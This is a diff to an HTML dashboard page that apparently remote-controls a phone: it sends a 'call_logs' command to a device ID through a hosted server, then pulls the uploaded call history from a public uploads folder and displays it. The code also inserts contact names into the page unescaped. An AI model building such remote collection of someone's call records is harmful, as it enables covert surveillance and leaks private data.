@@ -12,6 +12,9 @@
             --glass-border: rgba(255, 255, 255, 0.2);
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
+            --incoming: #4caf50;
+            --outgoing: #ff9800;
+            --missed: #f44336;
         }
 
         body {
@@ -19,58 +22,63 @@
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
+            margin: 0; padding: 20px;
+            display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%;
-            max-width: 450px;
+            width: 100%; max-width: 500px;
             background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px;
-            padding: 20px;
+            border-radius: 30px; padding: 20px;
             border: 1px solid var(--glass-border);
             min-height: 80vh;
         }
 
         .header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 25px; padding-bottom: 15px;
             border-bottom: 1px solid var(--glass-border);
         }
 
-        .back-btn { color: var(--text-main); font-size: 1.2rem; text-decoration: none; margin-right: 15px; }
+        .back-btn {
+            color: var(--text-main); font-size: 1.2rem;
+            text-decoration: none; width: 40px; height: 40px;
+            background: var(--glass-bg); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+
         .page-title { font-size: 1.2rem; font-weight: bold; }
+        
+        .refresh-btn {
+            background: var(--glass-bg); border: 1px solid var(--glass-border);
+            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
+        }
 
         .log-list { display: flex; flex-direction: column; gap: 10px; max-height: 600px; overflow-y: auto; }
 
         .log-card {
-            background: var(--glass-bg);
-            padding: 12px 15px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            border: 1px solid var(--glass-border);
+            background: var(--glass-bg); padding: 12px 15px;
+            border-radius: 12px; display: flex; align-items: center;
+            border: 1px solid var(--glass-border); transition: 0.2s;
         }
+        .log-card:hover { transform: translateX(3px); background: rgba(255,255,255,0.15); }
 
         .log-icon {
-            font-size: 1.2rem;
-            margin-right: 15px;
-            width: 30px;
-            text-align: center;
+            font-size: 1.2rem; margin-right: 15px; width: 35px; height: 35px;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(255,255,255,0.05); border-radius: 50%;
         }
         
-        .incoming { color: #4caf50; transform: rotate(135deg); }
-        .outgoing { color: #ff9800; transform: rotate(45deg); }
-        .missed { color: #f44336; transform: rotate(135deg); }
+        /* Dynamic Colors */
+        .log-icon.incoming { color: var(--incoming); }
+        .log-icon.outgoing { color: var(--outgoing); }
+        .log-icon.missed { color: var(--missed); }
 
         .log-info { flex: 1; }
         .log-number { font-size: 1rem; font-weight: 500; }
         .log-meta { font-size: 0.75rem; color: var(--text-muted); margin-top: 4px; display: flex; gap: 10px; }
+        
+        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
     </style>
 </head>
 <body>
@@ -79,61 +87,107 @@
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <span class="page-title">Call History</span>
+            <button onclick="fetchLogs()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
         <div class="log-list" id="logsContainer">
-            <div style="text-align: center; color: #666; margin-top: 50px;">Loading call logs...</div>
+            <div class="status-msg">
+                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                <p>Requesting Call Logs...</p>
+            </div>
         </div>
     </div>
 
     <script>
-        fetch('/api/call-logs/Child_Phone_01')
-            .then(response => response.json())
-            .then(data => {
-                const container = document.getElementById("logsContainer");
-                container.innerHTML = "";
+        // ✅ SERVER SETUP
+        const SERVER_URL = "https://child-v9no.onrender.com";
+        const DEVICE_ID = "M2103K19I";
 
-                if(data.length === 0) {
-                    container.innerHTML = "<div style='text-align:center; padding:20px;'>No call history found</div>";
-                    return;
-                }
+        // 1. Page Load hote hi Command bhejo
+        document.addEventListener("DOMContentLoaded", () => {
+            sendCommand();
+            // 5 second baad file check karo
+            setTimeout(fetchLogs, 5000);
+        });
 
-                data.forEach(log => {
-                    let iconClass = "incoming";
-                    let iconName = "fa-arrow-down";
-                    
-                    // Call type ke hisab se icon color
-                    if(log.type.toLowerCase().includes("outgoing")) {
-                        iconClass = "outgoing";
-                        iconName = "fa-arrow-up";
-                    } else if(log.type.toLowerCase().includes("missed") || log.type.toLowerCase().includes("rejected")) {
-                        iconClass = "missed";
-                        iconName = "fa-phone-slash";
+        function sendCommand() {
+            fetch(`${SERVER_URL}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: 'call_logs' })
+            }).then(() => console.log("Call Logs Command Sent"));
+        }
+
+        // 2. Fetch Data from Server File
+        function fetchLogs() {
+            const container = document.getElementById("logsContainer");
+
+            // Server ke uploads folder se 'call_logs.json' uthayega
+            fetch(`${SERVER_URL}/uploads/call_logs.json?t=${new Date().getTime()}`)
+                .then(response => {
+                    if (!response.ok) throw new Error("File not found");
+                    return response.json();
+                })
+                .then(data => {
+                    container.innerHTML = ""; // Clear Loading
+
+                    if (!data || data.length === 0) {
+                        container.innerHTML = "<div class='status-msg'>No call history found</div>";
+                        return;
                     }
 
-                    const card = `
-                        <div class="log-card">
-                            <div class="log-icon ${iconClass}">
-                                <i class="fa-solid ${iconName}"></i>
-                            </div>
-                            <div class="log-info">
-                                <div class="log-number">${log.number}</div>
-                                <div class="log-meta">
-                                    <span>${log.date}</span>
-                                    <span>•</span>
-                                    <span>${log.duration}</span>
+                    // Logs ko loop mein dikhao (Newest first)
+                    data.reverse().forEach(log => {
+                        let iconClass = "incoming";
+                        let iconName = "fa-arrow-down";
+                        
+                        const type = (log.type || "").toLowerCase();
+
+                        if(type.includes("outgoing")) {
+                            iconClass = "outgoing";
+                            iconName = "fa-arrow-up"; // Upar teer (orange)
+                        } else if(type.includes("missed") || type.includes("rejected")) {
+                            iconClass = "missed";
+                            iconName = "fa-phone-slash"; // Kata hua phone (red)
+                        }
+
+                        // Date Formatting (Agar timestamp hai to convert karo, nahi to text)
+                        let displayDate = log.date;
+                        if (!isNaN(log.date)) {
+                            displayDate = new Date(parseInt(log.date)).toLocaleString();
+                        }
+
+                        const card = `
+                            <div class="log-card">
+                                <div class="log-icon ${iconClass}">
+                                    <i class="fa-solid ${iconName}"></i>
+                                </div>
+                                <div class="log-info">
+                                    <div class="log-number">${log.name || log.number || "Unknown"}</div>
+                                    <div class="log-meta">
+                                        <span>${displayDate || "Unknown Date"}</span>
+                                        <span>•</span>
+                                        <span>${log.duration || "0s"}</span>
+                                    </div>
                                 </div>
                             </div>
-                        </div>
-                    `;
-                    container.innerHTML += card;
+                        `;
+                        container.innerHTML += card;
+                    });
+                })
+                .catch(err => {
+                    console.log("Waiting for data...");
+                    // Agar pehle se "Requesting" likha hai, toh change mat karo
+                    if (!container.innerHTML.includes("card")) {
+                        container.innerHTML = `
+                            <div class="status-msg">
+                                <i class="fa-solid fa-hourglass-half" style="font-size: 1.5rem;"></i>
+                                <p>Waiting for Phone...</p>
+                                <small>Data not received yet. Check again in 10s.</small>
+                            </div>`;
+                    }
                 });
-            })
-            .catch(err => {
-                console.error("Error:", err);
-                document.getElementById("logsContainer").innerHTML = 
-                    "<div style='text-align:center; color:red;'>Failed to load logs.</div>";
-            });
+        }
     </script>
 </body>
 </html>
